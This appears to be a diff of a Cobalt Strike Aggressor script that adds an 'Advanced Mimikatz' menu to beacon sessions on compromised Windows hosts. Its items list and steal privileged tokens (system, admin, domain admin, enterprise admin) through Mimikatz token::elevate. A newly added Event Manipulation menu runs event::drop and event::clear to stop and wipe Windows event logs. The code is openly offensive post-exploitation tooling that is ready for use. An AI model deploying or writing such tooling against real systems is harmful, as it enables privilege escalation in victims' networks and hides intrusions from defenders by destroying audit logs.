@@ -1,12 +1,24 @@
 ##############################
 
+
+
 ##  
+
+
 
 ##  Define the popup menu
 
+
+
 ##
 
+
+
 ##############################
+
+
+
+
 
 
 
@@ -14,7 +26,13 @@ popup beacon_top {
 
 
 
+
+
+
+
 	menu "Advanced Mimikatz" {
+
+
 
 	
 
@@ -22,17 +40,37 @@ popup beacon_top {
 
 
 
+
+
+
+
+
+
 ###################################
+
+
 
 ##  
 
+
+
 ##  Begin Token Elevation Menu
+
+
 
 ##
 
+
+
 ###################################
 
+
+
 menu "Token Enumeration"
+
+
+
+
 
 
 
@@ -40,15 +78,33 @@ menu "Token Enumeration"
 
 
 
+
+
+
+
 #####################################
+
+
 
 ##  
 
+
+
 ##  List all Tokens
+
+
 
 ##
 
+
+
 #####################################
+
+
+
+
+
+
 
 
 
@@ -58,7 +114,15 @@ menu "Token Enumeration"
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -66,7 +130,15 @@ menu "Token Enumeration"
 
 
 
+
+
+
+
 					tokenlist($bid);
+
+
+
+
 
 
 
@@ -74,21 +146,45 @@ menu "Token Enumeration"
 
 
 
+
+
+
+
 			}
+
+
 
 			
 
 
 
+
+
+
+
 ##############################
+
+
 
 ##  
 
+
+
 ##  Function - List Tokens
+
+
 
 ##
 
+
+
 ##############################
+
+
+
+
+
+
 
 
 
@@ -98,7 +194,15 @@ sub tokenlist{
 
 
 
+
+
+
+
 bmimikatz($1, "token::list");
+
+
+
+
 
 
 
@@ -106,15 +210,33 @@ bmimikatz($1, "token::list");
 
 
 
+
+
+
+
 ##############################
+
+
 
 ##  
 
+
+
 ##  List Admin tokens
+
+
 
 ##
 
+
+
 ##############################
+
+
+
+
+
+
 
 
 
@@ -124,7 +246,15 @@ bmimikatz($1, "token::list");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -132,7 +262,15 @@ bmimikatz($1, "token::list");
 
 
 
+
+
+
+
 					listadmintokens($bid);
+
+
+
+
 
 
 
@@ -140,21 +278,45 @@ bmimikatz($1, "token::list");
 
 
 
+
+
+
+
 			}
+
+
 
 			
 
 
 
+
+
+
+
 #############################################
+
+
 
 ##  
 
+
+
 ##  Create Listing of Admin token function
+
+
 
 ##
 
+
+
 #############################################
+
+
+
+
+
+
 
 
 
@@ -164,7 +326,15 @@ sub listadmintokens{
 
 
 
+
+
+
+
 bmimikatz($1, "token::list /admin");
+
+
+
+
 
 
 
@@ -174,15 +344,37 @@ bmimikatz($1, "token::list /admin");
 
 
 
+
+
+
+
+
+
 ##############################
+
+
 
 ##  
 
+
+
 ##  List Domain Admin tokens
+
+
 
 ##
 
+
+
 ##############################
+
+
+
+
+
+
+
+
 
 
 
@@ -194,7 +386,15 @@ bmimikatz($1, "token::list /admin");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -202,7 +402,15 @@ bmimikatz($1, "token::list /admin");
 
 
 
+
+
+
+
 					listdatokens($bid);
+
+
+
+
 
 
 
@@ -210,7 +418,13 @@ bmimikatz($1, "token::list /admin");
 
 
 
+
+
+
+
 			}
+
+
 
 			
 
@@ -220,15 +434,37 @@ bmimikatz($1, "token::list /admin");
 
 
 
+
+
+
+
+
+
+
+
 #################################################
+
+
 
 ##  
 
+
+
 ##  Create Listing of Domain Admin token function
+
+
 
 ##
 
+
+
 #################################################
+
+
+
+
+
+
 
 
 
@@ -238,7 +474,15 @@ sub listdatokens{
 
 
 
+
+
+
+
 bmimikatz($1, "token::list /domainadmin");
+
+
+
+
 
 
 
@@ -248,15 +492,35 @@ bmimikatz($1, "token::list /domainadmin");
 
 
 
+
+
+
+
+
+
 ##################################
+
+
 
 ##  
 
+
+
 ##  List Enterprise Admin tokens
+
+
 
 ##
 
+
+
 ##################################
+
+
+
+
+
+
 
 
 
@@ -266,7 +530,15 @@ bmimikatz($1, "token::list /domainadmin");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -274,7 +546,15 @@ bmimikatz($1, "token::list /domainadmin");
 
 
 
+
+
+
+
 					listeatokens($bid);
+
+
+
+
 
 
 
@@ -282,19 +562,41 @@ bmimikatz($1, "token::list /domainadmin");
 
 
 
+
+
+
+
 			}
 
 
 
+
+
+
+
 ########################################################
+
+
 
 ##  
 
+
+
 ##  Create Listing of Enterprise Admin token function
+
+
 
 ##
 
+
+
 ########################################################
+
+
+
+
+
+
 
 
 
@@ -304,7 +606,15 @@ sub listeatokens{
 
 
 
+
+
+
+
 bmimikatz($1, "token::list /enterpriseadmin");
+
+
+
+
 
 
 
@@ -314,11 +624,25 @@ bmimikatz($1, "token::list /enterpriseadmin");
 
 
 
+
+
+
+
+
+
 } #This Brace marks the end of the Token Enumeration Stuff
 
 
 
+
+
+
+
 menu "Token Elevation"
+
+
+
+
 
 
 
@@ -328,15 +652,35 @@ menu "Token Elevation"
 
 
 
+
+
+
+
+
+
 #####################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to System
+
+
 
 ##
 
+
+
 #####################################
+
+
+
+
+
+
 
 
 
@@ -346,7 +690,15 @@ menu "Token Elevation"
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -354,7 +706,15 @@ menu "Token Elevation"
 
 
 
+
+
+
+
 					elevatesystem($bid);
+
+
+
+
 
 
 
@@ -362,21 +722,45 @@ menu "Token Elevation"
 
 
 
+
+
+
+
 			}
+
+
 
 			
 
 
 
+
+
+
+
 ##############################
+
+
 
 ##  
 
+
+
 ##  Elevate to System Token Function
+
+
 
 ##
 
+
+
 ##############################
+
+
+
+
+
+
 
 
 
@@ -386,7 +770,15 @@ sub elevatesystem{
 
 
 
+
+
+
+
 bmimikatz($1, "token::elevate /system");
+
+
+
+
 
 
 
@@ -398,15 +790,37 @@ bmimikatz($1, "token::elevate /system");
 
 
 
+
+
+
+
+
+
+
+
 #####################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to Admin
+
+
 
 ##
 
+
+
 #####################################
+
+
+
+
+
+
 
 
 
@@ -416,7 +830,15 @@ bmimikatz($1, "token::elevate /system");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -424,11 +846,23 @@ bmimikatz($1, "token::elevate /system");
 
 
 
+
+
+
+
 					elevateadmin($bid);
 
 
 
+
+
+
+
 				}
+
+
+
+
 
 
 
@@ -442,15 +876,37 @@ bmimikatz($1, "token::elevate /system");
 
 
 
+
+
+
+
+
+
+
+
+
+
 ##############################
+
+
 
 ##  
 
+
+
 ##  Elevate to Admin Token Function
+
+
 
 ##
 
+
+
 ##############################
+
+
+
+
 
 
 
@@ -458,7 +914,15 @@ sub elevateadmin{
 
 
 
+
+
+
+
 bmimikatz($1, "token::elevate /admin");
+
+
+
+
 
 
 
@@ -470,15 +934,37 @@ bmimikatz($1, "token::elevate /admin");
 
 
 
+
+
+
+
+
+
+
+
 #####################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to Domain Admin
+
+
 
 ##
 
+
+
 #####################################
+
+
+
+
+
+
 
 
 
@@ -488,7 +974,15 @@ bmimikatz($1, "token::elevate /admin");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -496,7 +990,15 @@ bmimikatz($1, "token::elevate /admin");
 
 
 
+
+
+
+
 					elevateDA($bid);
+
+
+
+
 
 
 
@@ -504,21 +1006,45 @@ bmimikatz($1, "token::elevate /admin");
 
 
 
+
+
+
+
 			}
 
-			
+
 
 			
+
+
+
+			
+
+
 
 ###########################################
+
+
 
 ##  
 
+
+
 ##  Elevate to Domain Admin Token Function
+
+
 
 ##
 
+
+
 ###########################################
+
+
+
+
+
+
 
 
 
@@ -528,7 +1054,15 @@ sub elevateDA{
 
 
 
+
+
+
+
 bmimikatz($1, "token::elevate /domainadmin");
+
+
+
+
 
 
 
@@ -538,15 +1072,35 @@ bmimikatz($1, "token::elevate /domainadmin");
 
 
 
+
+
+
+
+
+
 #########################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to Enterprise Admin
+
+
 
 ##
 
+
+
 #########################################
+
+
+
+
+
+
 
 
 
@@ -556,7 +1110,15 @@ bmimikatz($1, "token::elevate /domainadmin");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -564,7 +1126,15 @@ bmimikatz($1, "token::elevate /domainadmin");
 
 
 
+
+
+
+
 					elevateEA($bid);
+
+
+
+
 
 
 
@@ -572,21 +1142,43 @@ bmimikatz($1, "token::elevate /domainadmin");
 
 
 
+
+
+
+
 			}
 
-			
+
 
 			
+
+
+
+			
+
+
 
 ################################################
+
+
 
 ##  
 
+
+
 ##  Elevate to Enterprise Admin Token Function
+
+
 
 ##
 
+
+
 ################################################
+
+
+
+
 
 
 
@@ -594,7 +1186,15 @@ sub elevateEA{
 
 
 
+
+
+
+
 bmimikatz($1, "token::elevate /enterpriseadmin");
+
+
+
+
 
 
 
@@ -606,15 +1206,37 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
+
+
+
+
+
+
+
+
 #########################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to Custom User
+
+
 
 ##
 
+
+
 #########################################
+
+
+
+
+
+
 
 
 
@@ -624,7 +1246,15 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
+
+
+
+
 			local('$bid');
+
+
+
+
 
 
 
@@ -632,72 +1262,295 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
+
+
+
+
 					elevateCUSTOM($bid);
 
 
 
+
+
+
+
 				}
+
+
+
+
 
 
 
 			}
 
-			
+
 
 			
 
+
+
 			
+
+
+
+			
+
+
 
 ##############################################################################################
+
+
 
 ##  
 
+
+
 ##  Token Elevation to Custom User Function - This does not yet work, will fuck with later
+
+
 
 ##
 
+
+
 ##############################################################################################
 
-#
+
 
 #
 
-#
+
 
 #
+
+
+
+#
+
+
+
+#
+
+
 
 # sub elevateCUSTOM{
 
+
+
 #
+
+
 
 # bmimikatz($1, "token::elevate /$addVariable");
 
+
+
 #
+
+
 
 # }
 
+
+
 #
+
+
 
 #    dialog_description($dialog, "Please enter the Username to imitate it's token");
 
+
+
 #    drow_text($dialog, "user",  "User");
 
-#
+
 
 #
 
-#
+
 
 #
 
-#
+
 
 #
 
-						
 
-					}
+
+#
+
+
+
+#
+
+
+
+#
+
+
+
+
+
+} #This bracket represents the end of the Token Elevation Functions
+
+
+
+
+
+menu "Event Manipulation"
+
+
+
+
+
+
+
+{
+
+
+
+item "Drop Future Events"{
+
+
+
+			local('$bid');
+
+
+
+
+
+
+
+				foreach $bid ($1){
+
+
+
+
+
+
+
+					eventdrop($bid);
+
+
+
+
+
+
 
 				}
 
+
+
+}
+
+
+
+sub eventdrop{
+
+
+
+
+
+
+
+bmimikatz($1, "event::drop");
+
+
+
+
+
+
+
+}
+
+
+
+
+
+
+
+item "Clear All Events"{
+
+
+
+			local('$bid');
+
+
+
+
+
+
+
+				foreach $bid ($1){
+
+
+
+
+
+
+
+					eventclear($bid);
+
+
+
+
+
+
+
+				}
+
+
+
 			}
+
+			
+
+sub eventclear{
+
+
+
+
+
+
+
+bmimikatz($1, "event::clear");
+
+
+
+
+
+
+
+}
+
+
+
+		} #This Bracket Marks off the end of the Event Manipulation Menu
+
+
+
+
+
+
+
+
+
+									} #This Bracket Marks the end of the Advanced Mimikatz menu
+
+
+
+
+
+								} #This Bracket Marks off the end of the pop up menu
+
+
+
+				
+
+
+
+			
+
+		
+
